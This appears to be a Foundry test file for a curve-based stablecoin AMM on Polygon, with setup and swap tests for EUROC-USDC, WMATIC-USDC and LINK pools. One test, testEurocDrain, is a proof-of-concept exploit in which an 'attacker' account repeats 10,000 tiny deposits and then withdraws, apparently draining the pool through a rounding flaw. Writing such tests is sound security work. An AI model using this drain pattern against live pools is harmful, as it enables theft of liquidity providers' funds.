// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "../src/interfaces/IAssimilator.sol";
import "../src/interfaces/IOracle.sol";
import "../src/interfaces/IERC20Detailed.sol";
import "../src/AssimilatorFactory.sol";
import "../src/CurveFactoryV2.sol";
import "../src/Curve.sol";
import "../src/Config.sol";
import "../src/Structs.sol";
import "../src/Zap.sol";
import "../src/lib/ABDKMath64x64.sol";

import "./lib/MockUser.sol";
import "./lib/CheatCodes.sol";
import "./lib/Address.sol";
import "./lib/CurveParams.sol";
import "./lib/MockChainlinkOracle.sol";
import "./lib/MockOracleFactory.sol";
import "./lib/MockToken.sol";

import "./utils/Utils.sol";
import "forge-std/Test.sol";

contract V25Test is Test {
    using SafeMath for uint256;
    using SafeERC20 for IERC20Detailed;
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    Utils utils;

    // account order is lp provider, trader, treasury
    MockUser[] public accounts;

    // tokens
    IERC20Detailed euroc;
    IERC20Detailed usdc;
    IERC20Detailed weth;
    IERC20Detailed link;

    // oracles
    IOracle eurocOracle;
    IOracle usdcOracle;
    IOracle wethOracle;
    IOracle linkOracle;

    // decimals
    mapping(address => uint256) decimals;

    // curves
    Curve public eurocUsdcCurve;
    Curve public wethUsdcCurve;
    Curve public wethLinkCurve;

    Config config;
    CurveFactoryV2 curveFactory;
    AssimilatorFactory assimFactory;

    address public constant FAUCET = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    function setUp() public {
        utils = new Utils();
        // create temp accounts
        for (uint256 i = 0; i < 4; ++i) {
            accounts.push(new MockUser());
        }
        // init tokens
        euroc = IERC20Detailed(Polygon.EUROC);
        usdc = IERC20Detailed(Polygon.USDC);
        weth = IERC20Detailed(Polygon.WMATIC);
        link = IERC20Detailed(Polygon.LINK);

        eurocOracle = IOracle(Polygon.CHAINLINK_EUROS);
        usdcOracle = IOracle(Polygon.CHAINLINK_USDC);
        wethOracle = IOracle(Polygon.CHAINLINK_MATIC);
        linkOracle = IOracle(Polygon.CHAINLINK_LINK);

        // deploy a new config contract
        config = new Config(50000, address(accounts[2]));
        // deploy new assimilator factory
        assimFactory = new AssimilatorFactory();
        // deploy new curve factory
        curveFactory = new CurveFactoryV2(
            address(assimFactory),
            address(config),
            Polygon.WMATIC
        );
        assimFactory.setCurveFactory(address(curveFactory));
        // now deploy curves
        eurocUsdcCurve = createCurve(
            "euroc-usdc",
            address(euroc),
            address(usdc),
            address(eurocOracle),
            address(usdcOracle)
        );
        wethUsdcCurve = createCurve(
            "weth-usdc",
            address(weth),
            address(usdc),
            address(wethOracle),
            address(usdcOracle)
        );
        wethLinkCurve = createCurve(
            "weth-link",
            address(weth),
            address(link),
            address(wethOracle),
            address(linkOracle)
        );
    }

    // test euroc-usdc curve
    function testEurocDrain() public {
        uint256 amt = 10000000;
        uint256 _minQuoteAmount = 14121276011;
        uint256 _minBaseAmount = 39560427884641868524167;
        uint256 _maxQuoteAmount = 2852783032400000000000;
        uint256 _maxBaseAmount = 7992005633260983540235600000000;
        // mint tokens to attacker
        deal(
            address(euroc),
            address(accounts[1]),
            amt * decimals[address(euroc)]
        );
        deal(
            address(usdc),
            address(accounts[1]),
            amt * decimals[address(usdc)]
        );
        cheats.startPrank(address(accounts[1]));
        euroc.approve(address(eurocUsdcCurve), type(uint256).max);
        usdc.safeApprove(address(eurocUsdcCurve), type(uint256).max);
        cheats.stopPrank();
        // deposit from lp
        cheats.startPrank(address(accounts[0]));
        eurocUsdcCurve.deposit(
            221549340083079435688560,
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        uint256 crvEurocBal_1 = euroc.balanceOf(address(eurocUsdcCurve));
        uint256 crvUsdcBal_1 = usdc.balanceOf(address(eurocUsdcCurve));
        console.log("lp added, pool euroc balance is ", crvEurocBal_1);
        console.log("lp added, pool usdc balance is ", crvUsdcBal_1);
        cheats.stopPrank();
        // account 1 is an attacker

        // Loop 10 000  gas = 695594585   so if gas price is 231 wei =  0.000000231651787155 => Gas =  161 matic
        uint256 e_u_bal_0 = euroc.balanceOf(address(accounts[1]));
        uint256 u_u_bal_0 = usdc.balanceOf(address(accounts[1]));
        console.log("before deposit, user euroc bal is ", e_u_bal_0);
        console.log("before deposit, user usdc bal is ", u_u_bal_0);
        cheats.startPrank(address(accounts[1]));
        for (uint256 i = 0; i < 10000; i++) {
            eurocUsdcCurve.deposit(
                18003307228925150,
                0,
                0,
                _maxQuoteAmount,
                _maxBaseAmount,
                block.timestamp + 60
            );
        }
        // eurocUsdcCurve.deposit(
        //     180033072289251500000,
        //     0,
        //     0,
        //     _maxQuoteAmount,
        //     _maxBaseAmount,
        //     block.timestamp + 60
        // );
        eurocUsdcCurve.withdraw(
            eurocUsdcCurve.balanceOf(address(accounts[1])),
            block.timestamp + 60
        );
        cheats.stopPrank();
        uint256 e_u_bal_1 = euroc.balanceOf(address(accounts[1]));
        uint256 u_u_bal_1 = usdc.balanceOf(address(accounts[1]));
        console.log("after withdraw, user euroc bal is ", e_u_bal_1);
        console.log("after withdraw, user usdc bal is ", u_u_bal_1);
    }

    // test euroc-usdc curve
    function testEurocUsdcCurve() public {
        uint256 amt = 10000;
        // mint tokens to trader
        deal(
            address(euroc),
            address(accounts[1]),
            amt * decimals[address(euroc)]
        );
        deal(
            address(usdc),
            address(accounts[1]),
            amt * decimals[address(usdc)]
        );
        cheats.startPrank(address(accounts[1]));
        euroc.approve(address(eurocUsdcCurve), type(uint256).max);
        usdc.safeApprove(address(eurocUsdcCurve), type(uint256).max);
        cheats.stopPrank();
        // deposit from lp
        cheats.startPrank(address(accounts[0]));
        eurocUsdcCurve.deposit(
            100000 * 1e18,
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        uint256 crvEurocBal_1 = euroc.balanceOf(address(eurocUsdcCurve));
        uint256 crvUsdcBal_1 = usdc.balanceOf(address(eurocUsdcCurve));
        console.log("lp added, pool euroc balance is ", crvEurocBal_1);
        console.log("lp added, pool usdc balance is ", crvUsdcBal_1);
        cheats.stopPrank();
        // now trade
        cheats.startPrank(address(accounts[1]));
        uint256 e_bal_0 = euroc.balanceOf(address(accounts[1]));
        uint256 u_bal_0 = usdc.balanceOf(address(accounts[1]));
        console.log("before swap, user euroc balance is ", e_bal_0);
        console.log("before swap, user usdc balance is ", u_bal_0);
        eurocUsdcCurve.originSwap(
            address(euroc),
            address(usdc),
            e_bal_0,
            0,
            block.timestamp + 60
        );
        uint256 crvEurocBal_2 = euroc.balanceOf(address(eurocUsdcCurve));
        uint256 crvUsdcBal_2 = usdc.balanceOf(address(eurocUsdcCurve));
        console.log(
            "euroc to usdc swapped, pool euroc balance is ",
            crvEurocBal_2
        );
        console.log(
            "euroc to usdc swapped, pool usdc balance is ",
            crvUsdcBal_2
        );

        uint256 e_bal_1 = euroc.balanceOf(address(accounts[1]));
        uint256 u_bal_1 = usdc.balanceOf(address(accounts[1]));
        cheats.stopPrank();
        console.log("euroc to usdc swapped, user euroc balance is ", e_bal_1);
        console.log("euroc to usdc swapped, user usdc balance is ", u_bal_1);
        console.logString("swap diff, euroc & usdc");
        console.log(e_bal_0 - e_bal_1);
        console.log(u_bal_1 - u_bal_0);
    }

    // test weth-usdc curve, usdc is a quote
    function testWethUsdcCurve() public {
        uint256 amt = 10;
        // mint tokens to trader
        deal(
            address(weth),
            address(accounts[1]),
            amt * decimals[address(weth)]
        );
        deal(
            address(usdc),
            address(accounts[1]),
            amt * decimals[address(usdc)]
        );
        cheats.startPrank(address(accounts[1]));
        weth.approve(address(wethUsdcCurve), type(uint256).max);
        usdc.safeApprove(address(wethUsdcCurve), type(uint256).max);
        cheats.stopPrank();
        // deposit from lp
        cheats.startPrank(address(accounts[0]));
        wethUsdcCurve.deposit(
            100 * 1e18,
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        uint256 crvWethBal_1 = weth.balanceOf(address(wethUsdcCurve));
        uint256 crvUsdcBal_1 = usdc.balanceOf(address(wethUsdcCurve));
        console.log("lp added, pool weth balance is ", crvWethBal_1);
        console.log("lp added, pool usdc balance is ", crvUsdcBal_1);
        cheats.stopPrank();
        // now trade
        cheats.startPrank(address(accounts[1]));
        uint256 e_bal_0 = weth.balanceOf(address(accounts[1]));
        uint256 u_bal_0 = usdc.balanceOf(address(accounts[1]));
        console.log("before swap, user weth balance is ", e_bal_0);
        console.log("before swap, user usdc balance is ", u_bal_0);
        wethUsdcCurve.originSwap(
            address(weth),
            address(usdc),
            e_bal_0,
            0,
            block.timestamp + 60
        );
        uint256 crvWethBal_2 = weth.balanceOf(address(wethUsdcCurve));
        uint256 crvUsdcBal_2 = usdc.balanceOf(address(wethUsdcCurve));
        console.log(
            "weth to usdc swapped, pool weth balance is ",
            crvWethBal_2
        );
        console.log(
            "weth to usdc swapped, pool usdc balance is ",
            crvUsdcBal_2
        );

        uint256 e_bal_1 = weth.balanceOf(address(accounts[1]));
        uint256 u_bal_1 = usdc.balanceOf(address(accounts[1]));
        cheats.stopPrank();
        console.log("weth to usdc swapped, user weth balance is ", e_bal_1);
        console.log("weth to usdc swapped, user usdc balance is ", u_bal_1);
        console.logString("swap diff, weth & usdc");
        console.log(e_bal_0 - e_bal_1);
        console.log(u_bal_1 - u_bal_0);
    }

    // test weth-usdc curve, usdc is a quote
    function testETHUsdcCurve() public {
        // send ETH to lp provider and a trader
        cheats.startPrank(FAUCET);
        payable(address(accounts[0])).call{value: 100 ether}("");
        payable(address(accounts[1])).call{value: 100 ether}("");
        cheats.stopPrank();
        // approve from the provider side
        cheats.startPrank(address(accounts[1]));
        weth.safeApprove(address(wethUsdcCurve), type(uint256).max);
        usdc.safeApprove(address(wethUsdcCurve), type(uint256).max);
        cheats.stopPrank();
        // deposit from lp
        cheats.startPrank(address(accounts[0]));
        wethUsdcCurve.depositETH{value: 100 ether}(
            100 * 1e18,
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        uint256 crvEthBal_1 = (address(wethUsdcCurve)).balance;
        uint256 crvUsdcBal_1 = usdc.balanceOf(address(wethUsdcCurve));
        cheats.stopPrank();
        // now trade
        cheats.startPrank(address(accounts[1]));
        uint256 e_bal_0 = (address(accounts[1])).balance;
        uint256 u_bal_0 = usdc.balanceOf(address(accounts[1]));
        console.log("before swap, user eth balance is ", e_bal_0);
        console.log("before swap, user usdc balance is ", u_bal_0);
        console.logString("account 1 address is ");
        console.log(address(accounts[1]));
        wethUsdcCurve.originSwapFromETH{value: 10 ether}(
            address(usdc),
            0,
            block.timestamp + 60
        );
        uint256 crvWethBal_2 = (address(wethUsdcCurve)).balance;
        uint256 crvUsdcBal_2 = usdc.balanceOf(address(wethUsdcCurve));
        console.log("eth to usdc swapped, pool weth balance is ", crvWethBal_2);
        console.log("eth to usdc swapped, pool usdc balance is ", crvUsdcBal_2);

        uint256 e_bal_1 = (address(accounts[1])).balance;
        uint256 u_bal_1 = usdc.balanceOf(address(accounts[1]));
        cheats.stopPrank();
        console.log("eth to usdc swapped, user weth balance is ", e_bal_1);
        console.log("eth to usdc swapped, user usdc balance is ", u_bal_1);
        console.logString("swap diff, eth & usdc");
        console.log(e_bal_0 - e_bal_1);
        console.log(u_bal_1 - u_bal_0);
        // now swap back to ETH using USDC balance
        cheats.startPrank(address(accounts[1]));
        wethUsdcCurve.originSwapToETH(
            address(usdc),
            u_bal_1,
            0,
            block.timestamp + 60
        );
        cheats.stopPrank();
        uint256 e_bal_2 = (address(accounts[1])).balance;
        uint256 u_bal_2 = usdc.balanceOf(address(accounts[1]));
        console.log("usdc to eth swapped, user eth balance is ", e_bal_2);
        console.log("usdc to eth swapped, user usdc balance is ", u_bal_2);
        console.logString("swap diff, eth & usdc");
        console.log(e_bal_2 - e_bal_1);
        console.log(u_bal_1 - u_bal_2);
    }

    // test weth-usdc curve, usdc is a quote
    function testETHLinkCurve() public {
        // send ETH to lp provider and a trader
        cheats.startPrank(FAUCET);
        payable(address(accounts[0])).call{value: 100 ether}("");
        payable(address(accounts[1])).call{value: 100 ether}("");
        cheats.stopPrank();
        // approve from the provider side
        cheats.startPrank(address(accounts[1]));
        weth.safeApprove(address(wethLinkCurve), type(uint256).max);
        link.safeApprove(address(wethLinkCurve), type(uint256).max);
        cheats.stopPrank();
        // deposit from lp
        cheats.startPrank(address(accounts[0]));
        wethLinkCurve.depositETH{value: 100 ether}(
            100 * 1e18,
            0,
            0,
            type(uint256).max,
            type(uint256).max,
            block.timestamp + 60
        );
        uint256 crvEthBal_1 = weth.balanceOf(address(wethLinkCurve));
        uint256 crvUsdcBal_1 = link.balanceOf(address(wethLinkCurve));
        console.log(
            "weth added to the pool by lp, pool weth balance is ",
            crvEthBal_1
        );
        console.log(
            "link added to the pool by lp, pool link balance is ",
            crvUsdcBal_1
        );
        cheats.stopPrank();
        // now trade
        cheats.startPrank(address(accounts[1]));
        uint256 e_bal_0 = (address(accounts[1])).balance;
        uint256 u_bal_0 = link.balanceOf(address(accounts[1]));
        console.log("before swap, user eth balance is ", e_bal_0);
        console.log("before swap, user link balance is ", u_bal_0);
        wethLinkCurve.originSwapFromETH{value: 10 ether}(
            address(link),
            0,
            block.timestamp + 60
        );
        uint256 crvWethBal_2 = weth.balanceOf(address(wethLinkCurve));
        uint256 crvUsdcBal_2 = link.balanceOf(address(wethLinkCurve));
        console.log("eth to link swapped, pool weth balance is ", crvWethBal_2);
        console.log("eth to link swapped, pool link balance is ", crvUsdcBal_2);

        uint256 e_bal_1 = weth.balanceOf(address(accounts[1]));
        uint256 u_bal_1 = link.balanceOf(address(accounts[1]));
        cheats.stopPrank();
        console.log("eth to link swapped, user weth balance is ", e_bal_1);
        console.log("eth to link swapped, user link balance is ", u_bal_1);
        console.logString("swap diff, eth & usdc");
        console.log(e_bal_0 - e_bal_1);
        console.log(u_bal_1 - u_bal_0);
        // now swap back to ETH using USDC balance
        cheats.startPrank(address(accounts[1]));
        wethLinkCurve.originSwapToETH(
            address(link),
            u_bal_1,
            0,
            block.timestamp + 60
        );
        cheats.stopPrank();
        uint256 e_bal_2 = (address(accounts[1])).balance;
        uint256 u_bal_2 = link.balanceOf(address(accounts[1]));
        console.log("link to eth swapped, user eth balance is ", e_bal_2);
        console.log("link to eth swapped, user link balance is ", u_bal_2);
        console.logString("swap diff, eth & link");
        console.log(e_bal_2 - e_bal_1);
        console.log(u_bal_1 - u_bal_2);
    }

    // helper
    function createCurve(
        string memory name,
        address base,
        address quote,
        address baseOracle,
        address quoteOracle
    ) public returns (Curve) {
        cheats.startPrank(address(accounts[2]));
        CurveInfo memory curveInfo = CurveInfo(
            string(abi.encode("dfx-curve-", name)),
            string(abi.encode("lp-", name)),
            base,
            quote,
            DefaultCurve.BASE_WEIGHT,
            DefaultCurve.QUOTE_WEIGHT,
            IOracle(baseOracle),
            IOracle(quoteOracle),
            DefaultCurve.ALPHA,
            DefaultCurve.BETA,
            DefaultCurve.MAX,
            DefaultCurve.EPSILON,
            DefaultCurve.LAMBDA
        );
        Curve _curve = curveFactory.newCurve(curveInfo);
        cheats.stopPrank();
        // now mint base token, update decimals map
        uint256 mintAmt = 300_000_000_000;
        uint256 baseDecimals = utils.tenToPowerOf(
            IERC20Detailed(base).decimals()
        );
        decimals[base] = baseDecimals;
        deal(base, address(accounts[0]), mintAmt.mul(baseDecimals));
        // now mint quote token, update decimals map
        uint256 quoteDecimals = utils.tenToPowerOf(
            IERC20Detailed(quote).decimals()
        );
        decimals[quote] = quoteDecimals;
        deal(quote, address(accounts[0]), mintAmt.mul(quoteDecimals));
        // now approve the deployed curve
        cheats.startPrank(address(accounts[0]));
        IERC20Detailed(base).safeApprove(address(_curve), type(uint256).max);
        IERC20Detailed(quote).safeApprove(address(_curve), type(uint256).max);
        cheats.stopPrank();
        return _curve;
    }
}
